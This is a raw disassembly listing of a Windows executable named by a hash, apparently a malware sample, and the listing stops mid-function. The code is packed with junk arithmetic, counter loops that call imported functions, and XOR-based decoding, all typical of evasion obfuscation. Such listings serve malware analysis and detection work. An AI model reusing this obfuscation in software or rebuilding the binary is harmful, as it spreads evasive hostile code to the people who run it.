
3c79800b46bcffb2a41b471f13ea810ad367a403b35d8a4bab47d88a8406a85b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
